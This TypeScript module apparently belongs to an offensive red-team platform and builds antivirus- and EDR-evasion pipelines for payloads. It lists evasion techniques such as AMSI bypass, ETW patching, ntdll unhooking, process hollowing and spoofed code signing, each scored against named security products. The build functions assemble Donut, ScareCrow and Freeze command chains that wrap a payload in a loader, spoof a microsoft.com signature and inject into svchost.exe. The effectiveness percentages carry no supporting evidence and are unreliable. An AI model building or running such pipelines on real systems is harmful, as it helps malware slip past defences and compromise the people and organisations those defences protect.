// server/lib/payload-transform-pipeline.ts
var EVASION_TECHNIQUES = [
  {
    id: "shellcode_convert",
    name: "PE-to-Shellcode Conversion",
    description: "Convert PE/DLL to position-independent shellcode using Donut, removing PE headers that trigger static signatures",
    attackTechnique: "T1027.009",
    category: "signature",
    effectivenessVsEDR: { "Windows Defender": 70, "CrowdStrike": 50, "SentinelOne": 55, "Carbon Black": 65 },
    implementedBy: ["donut"]
  },
  {
    id: "import_hiding",
    name: "Import Address Table Hiding",
    description: "Resolve API imports at runtime via hash lookup instead of static IAT entries",
    attackTechnique: "T1027.007",
    category: "signature",
    effectivenessVsEDR: { "Windows Defender": 60, "CrowdStrike": 40, "SentinelOne": 45, "Carbon Black": 55 },
    implementedBy: ["donut", "scarecrow"]
  },
  {
    id: "string_encryption",
    name: "String Encryption",
    description: "Encrypt all strings in the payload and decrypt at runtime to evade static analysis",
    attackTechnique: "T1027",
    category: "signature",
    effectivenessVsEDR: { "Windows Defender": 65, "CrowdStrike": 35, "SentinelOne": 40, "Carbon Black": 50 },
    implementedBy: ["donut", "scarecrow"]
  },
  {
    id: "direct_syscalls",
    name: "Direct System Calls",
    description: "Invoke NT syscalls directly, bypassing ntdll.dll userland hooks placed by EDR",
    attackTechnique: "T1106",
    category: "api",
    effectivenessVsEDR: { "Windows Defender": 80, "CrowdStrike": 60, "SentinelOne": 65, "Carbon Black": 75 },
    implementedBy: ["scarecrow", "freeze"]
  },
  {
    id: "ntdll_unhook",
    name: "NTDLL Unhooking",
    description: "Load a fresh copy of ntdll.dll from disk to remove EDR hooks",
    attackTechnique: "T1562.001",
    category: "api",
    effectivenessVsEDR: { "Windows Defender": 75, "CrowdStrike": 55, "SentinelOne": 60, "Carbon Black": 70 },
    implementedBy: ["scarecrow"]
  },
  {
    id: "etw_patch",
    name: "ETW Patching",
    description: "Patch Event Tracing for Windows to prevent telemetry from reaching the EDR",
    attackTechnique: "T1562.006",
    category: "behavioral",
    effectivenessVsEDR: { "Windows Defender": 70, "CrowdStrike": 45, "SentinelOne": 50, "Carbon Black": 60 },
    implementedBy: ["scarecrow", "freeze"]
  },
  {
    id: "amsi_bypass",
    name: "AMSI Bypass",
    description: "Patch the Antimalware Scan Interface to prevent script content scanning",
    attackTechnique: "T1562.001",
    category: "api",
    effectivenessVsEDR: { "Windows Defender": 85, "CrowdStrike": 30, "SentinelOne": 35, "Carbon Black": 40 },
    implementedBy: ["scarecrow"]
  },
  {
    id: "process_hollowing",
    name: "Process Hollowing",
    description: "Create a suspended process, hollow out its memory, and inject the payload",
    attackTechnique: "T1055.012",
    category: "process",
    effectivenessVsEDR: { "Windows Defender": 60, "CrowdStrike": 35, "SentinelOne": 40, "Carbon Black": 50 },
    implementedBy: ["scarecrow"]
  },
  {
    id: "early_bird_apc",
    name: "Early Bird APC Injection",
    description: "Queue an APC to the main thread of a suspended process before it initializes",
    attackTechnique: "T1055.004",
    category: "process",
    effectivenessVsEDR: { "Windows Defender": 65, "CrowdStrike": 40, "SentinelOne": 45, "Carbon Black": 55 },
    implementedBy: ["scarecrow"]
  },
  {
    id: "dll_sideload",
    name: "DLL Side-Loading",
    description: "Abuse legitimate application DLL search order to load a malicious DLL",
    attackTechnique: "T1574.002",
    category: "process",
    effectivenessVsEDR: { "Windows Defender": 70, "CrowdStrike": 50, "SentinelOne": 55, "Carbon Black": 60 },
    implementedBy: ["scarecrow"]
  },
  {
    id: "code_signing",
    name: "Code Signing",
    description: "Sign the payload with a valid or spoofed code-signing certificate",
    attackTechnique: "T1553.002",
    category: "signature",
    effectivenessVsEDR: { "Windows Defender": 75, "CrowdStrike": 45, "SentinelOne": 50, "Carbon Black": 65 },
    implementedBy: ["scarecrow"]
  },
  {
    id: "suspend_execution",
    name: "Suspended Process Execution",
    description: "Create process in suspended state, inject payload, then resume \u2014 avoids behavioral detection of process creation",
    attackTechnique: "T1055",
    category: "process",
    effectivenessVsEDR: { "Windows Defender": 70, "CrowdStrike": 50, "SentinelOne": 55, "Carbon Black": 60 },
    implementedBy: ["freeze"]
  },
  {
    id: "alternative_execution",
    name: "Alternative Execution via CreateTimerQueueTimer",
    description: "Execute shellcode via timer callback instead of CreateThread \u2014 less monitored API",
    attackTechnique: "T1106",
    category: "api",
    effectivenessVsEDR: { "Windows Defender": 75, "CrowdStrike": 55, "SentinelOne": 60, "Carbon Black": 65 },
    implementedBy: ["freeze"]
  }
];
function buildPipeline(profile, options) {
  const arch = options?.targetArch || "x64";
  const os = options?.targetOS || "windows";
  const injection = options?.injectionMethod || "none";
  const loader = options?.loaderType || "binary";
  const inputFmt = options?.inputFormat || "exe";
  const id = `pipeline-${profile}-${Date.now()}`;
  switch (profile) {
    case "none":
      return buildNoneProfile(id, arch, os);
    case "low":
      return buildLowProfile(id, arch, os, inputFmt);
    case "medium":
      return buildMediumProfile(id, arch, os, inputFmt, injection, loader, options?.targetProcess);
    case "high":
      return buildHighProfile(id, arch, os, inputFmt, injection, loader, options?.targetProcess, options?.codeSignCert);
    default:
      return buildNoneProfile(id, arch, os);
  }
}
function buildNoneProfile(id, arch, os) {
  return {
    id,
    name: "No Evasion (Raw Payload)",
    profile: "none",
    steps: [],
    targetArch: arch,
    targetOS: os,
    injectionMethod: "none",
    loaderType: "binary",
    directSyscalls: false,
    unhookNtdll: false,
    patchEtw: false,
    bypassAmsi: false,
    stealthRating: 5,
    allAttackTechniques: []
  };
}
function buildLowProfile(id, arch, os, inputFmt) {
  const steps = [
    {
      order: 1,
      tool: "donut",
      description: "Convert PE to position-independent shellcode with string encryption",
      cliCommand: `donut -i {{INPUT}} -o {{OUTPUT}} -a ${arch === "x64" ? "2" : "1"} -e 3 -z 2`,
      inputFormat: inputFmt,
      outputFormat: "shellcode",
      attackTechniques: ["T1027.009", "T1027"],
      evasionTechniques: ["shellcode_convert", "string_encryption", "import_hiding"],
      detectionReduction: 30,
      requiresCodeSign: false,
      config: {
        arch: arch === "x64" ? 2 : 1,
        entropy: 3,
        compress: 2
      }
    }
  ];
  return {
    id,
    name: "Low Evasion (Shellcode Conversion)",
    profile: "low",
    steps,
    targetArch: arch,
    targetOS: os,
    injectionMethod: "none",
    loaderType: "binary",
    directSyscalls: false,
    unhookNtdll: false,
    patchEtw: false,
    bypassAmsi: false,
    stealthRating: 25,
    allAttackTechniques: ["T1027.009", "T1027"]
  };
}
function buildMediumProfile(id, arch, os, inputFmt, injection, loader, targetProcess) {
  const scInjection = injection === "none" ? "process_hollowing" : injection;
  const scLoader = mapLoaderToScareCrowFlag(loader);
  const steps = [
    {
      order: 1,
      tool: "donut",
      description: "Convert PE to position-independent shellcode with entropy reduction",
      cliCommand: `donut -i {{INPUT}} -o {{STEP1_OUT}} -a ${arch === "x64" ? "2" : "1"} -e 3 -z 2`,
      inputFormat: inputFmt,
      outputFormat: "shellcode",
      attackTechniques: ["T1027.009", "T1027"],
      evasionTechniques: ["shellcode_convert", "string_encryption", "import_hiding"],
      detectionReduction: 30,
      requiresCodeSign: false,
      config: { arch: arch === "x64" ? 2 : 1, entropy: 3, compress: 2 }
    },
    {
      order: 2,
      tool: "scarecrow",
      description: `Wrap shellcode in EDR-evasive ${scLoader} loader with ${scInjection}`,
      cliCommand: `ScareCrow -I {{STEP1_OUT}} -Loader ${scLoader} -injection ${mapInjectionToScareCrowFlag(scInjection)}${targetProcess ? ` -process "${targetProcess}"` : ""} -domain microsoft.com -o {{OUTPUT}}`,
      inputFormat: "shellcode",
      outputFormat: loader === "dll_sideload" ? "dll" : "exe",
      attackTechniques: ["T1055.012", "T1106", "T1562.001", "T1562.006"],
      evasionTechniques: [
        "direct_syscalls",
        "ntdll_unhook",
        "etw_patch",
        mapInjectionToTechnique(scInjection)
      ],
      detectionReduction: 45,
      requiresCodeSign: false,
      config: {
        loader: scLoader,
        injection: scInjection,
        domain: "microsoft.com"
      }
    }
  ];
  return {
    id,
    name: "Medium Evasion (Donut + ScareCrow)",
    profile: "medium",
    steps,
    targetArch: arch,
    targetOS: os,
    injectionMethod: scInjection,
    loaderType: loader,
    targetProcess,
    directSyscalls: true,
    unhookNtdll: true,
    patchEtw: true,
    bypassAmsi: false,
    stealthRating: 60,
    allAttackTechniques: [
      "T1027.009",
      "T1027",
      "T1055.012",
      "T1106",
      "T1562.001",
      "T1562.006"
    ]
  };
}
function buildHighProfile(id, arch, os, inputFmt, injection, loader, targetProcess, codeSignCert) {
  const scInjection = injection === "none" ? "early_bird" : injection;
  const scLoader = mapLoaderToScareCrowFlag(loader);
  const steps = [
    {
      order: 1,
      tool: "donut",
      description: "Convert PE to shellcode with maximum entropy reduction and compression",
      cliCommand: `donut -i {{INPUT}} -o {{STEP1_OUT}} -a ${arch === "x64" ? "2" : "1"} -e 3 -z 2 -b 1`,
      inputFormat: inputFmt,
      outputFormat: "shellcode",
      attackTechniques: ["T1027.009", "T1027"],
      evasionTechniques: ["shellcode_convert", "string_encryption", "import_hiding"],
      detectionReduction: 30,
      requiresCodeSign: false,
      config: { arch: arch === "x64" ? 2 : 1, entropy: 3, compress: 2, bypass: 1 }
    },
    {
      order: 2,
      tool: "scarecrow",
      description: `Wrap in EDR-evasive loader with ${scInjection}, AMSI bypass, ETW patch, and direct syscalls`,
      cliCommand: `ScareCrow -I {{STEP1_OUT}} -Loader ${scLoader} -injection ${mapInjectionToScareCrowFlag(scInjection)}${targetProcess ? ` -process "${targetProcess}"` : ""} -domain microsoft.com -etw -nosleep${codeSignCert ? ` -valid "${codeSignCert}"` : ""} -o {{STEP2_OUT}}`,
      inputFormat: "shellcode",
      outputFormat: loader === "dll_sideload" ? "dll" : "exe",
      attackTechniques: [
        "T1055.012",
        "T1055.004",
        "T1106",
        "T1562.001",
        "T1562.006",
        "T1553.002"
      ],
      evasionTechniques: [
        "direct_syscalls",
        "ntdll_unhook",
        "etw_patch",
        "amsi_bypass",
        "code_signing",
        mapInjectionToTechnique(scInjection)
      ],
      detectionReduction: 55,
      requiresCodeSign: !!codeSignCert,
      config: {
        loader: scLoader,
        injection: scInjection,
        domain: "microsoft.com",
        etw: true,
        nosleep: true
      }
    },
    {
      order: 3,
      tool: "freeze",
      description: "Final wrapping with Freeze for suspended-process execution and alternative shellcode execution",
      cliCommand: `Freeze -I {{STEP2_OUT}} -process "${targetProcess || "svchost.exe"}" -o {{OUTPUT}}`,
      inputFormat: "shellcode",
      outputFormat: "exe",
      attackTechniques: ["T1055", "T1106"],
      evasionTechniques: ["suspend_execution", "alternative_execution"],
      detectionReduction: 25,
      requiresCodeSign: false,
      config: {
        process: targetProcess || "svchost.exe"
      }
    }
  ];
  return {
    id,
    name: "High Evasion (Donut \u2192 ScareCrow \u2192 Freeze)",
    profile: "high",
    steps,
    targetArch: arch,
    targetOS: os,
    injectionMethod: scInjection,
    loaderType: loader,
    targetProcess: targetProcess || "svchost.exe",
    directSyscalls: true,
    unhookNtdll: true,
    patchEtw: true,
    bypassAmsi: true,
    codeSignCert,
    stealthRating: 82,
    allAttackTechniques: [
      "T1027.009",
      "T1027",
      "T1055.012",
      "T1055.004",
      "T1055",
      "T1106",
      "T1562.001",
      "T1562.006",
      "T1553.002"
    ]
  };
}
function mapLoaderToScareCrowFlag(loader) {
  switch (loader) {
    case "binary":
      return "binary";
    case "dll_sideload":
      return "dll";
    case "control_panel":
      return "control";
    case "wscript":
      return "wscript";
    case "mshta":
      return "mshta";
    case "excel_xll":
      return "excel";
    case "msi_wrapper":
      return "msiexec";
    default:
      return "binary";
  }
}
function mapInjectionToScareCrowFlag(injection) {
  switch (injection) {
    case "process_hollowing":
      return "ProcessHollowing";
    case "early_bird":
      return "EarlyBird";
    case "thread_hijack":
      return "ThreadHijack";
    case "apc_queue":
      return "QueueUserAPC";
    case "module_stomping":
      return "ModuleStomping";
    case "phantom_dll":
      return "PhantomDLL";
    case "syscall_direct":
      return "Syscall";
    default:
      return "ProcessHollowing";
  }
}
function mapInjectionToTechnique(injection) {
  switch (injection) {
    case "process_hollowing":
      return "process_hollowing";
    case "early_bird":
      return "early_bird_apc";
    case "apc_queue":
      return "early_bird_apc";
    default:
      return "process_hollowing";
  }
}

export {
  EVASION_TECHNIQUES,
  buildPipeline
};
